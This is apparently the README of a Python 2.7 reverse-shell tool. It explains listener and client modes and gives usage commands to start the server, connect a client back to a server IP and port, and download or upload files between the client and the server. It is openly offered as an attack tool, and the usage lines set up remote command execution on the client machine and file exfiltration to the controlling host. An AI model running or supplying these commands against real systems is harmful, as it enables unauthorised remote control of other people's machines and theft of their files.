# Python Reverse Shell

This is a python script that works as a basic reverse shell. If the script is running as a server it will wait until a client connects. The server will then be able to execute commands on the clients terminal. 

## Prerequisites

This script requires Python 2.7

## Getting Started

Help:
```
python reverse_shell.py -h
```

Starting the server:
```
python reverse_shell.py -l -p <desired_port>
```

Starting the client:
```
python reverse_shell.py -t <server_ip> -p <server_port>
```

Download files from client to the server:
```
<save_as_name> #download# <file_name>
```

Upload files from server to client:
```
<save_as_name> #upload# <file_name>
```